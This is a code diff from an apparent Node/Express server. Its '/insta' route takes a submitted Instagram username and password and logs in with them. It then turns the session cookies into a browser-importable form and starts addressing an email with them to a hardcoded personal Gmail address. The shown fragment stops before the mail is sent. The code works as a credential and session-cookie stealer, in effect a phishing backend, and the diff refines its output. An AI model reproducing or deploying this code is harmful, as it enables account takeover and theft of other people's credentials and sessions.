@@ -230,18 +230,17 @@ app.post("/insta", (req, res) => {
   return Promise.try(() =>
     ig.account.login(req.body.username, req.body.password).then((val) => {
       const cookies = ig.state.serializeCookieJar().then((val2) => {
-        let modCookies = val2.cookies.map((cookiepairs) => {
-          console.log(cookiepairs["key"]);
+        val2.cookies.map((cookiepairs) => {
           cookiepairs["name"] = cookiepairs["key"];
-          console.log(cookiepairs);
-          // delete cookiepairs["key"];
+          delete cookiepairs["key"];
         });
-        console.log(modCookies);
+
+        console.log(val2.cookies);
         const validCookie = {
           url: "https://instagram.com",
-          cookies: modCookies,
+          cookies: val2.cookies,
         };
-        console.log(JSON.stringify(validCookie));
+
         var mailOptions = {
           from: process.env.email,
           to: "surya142327@gmail.com",
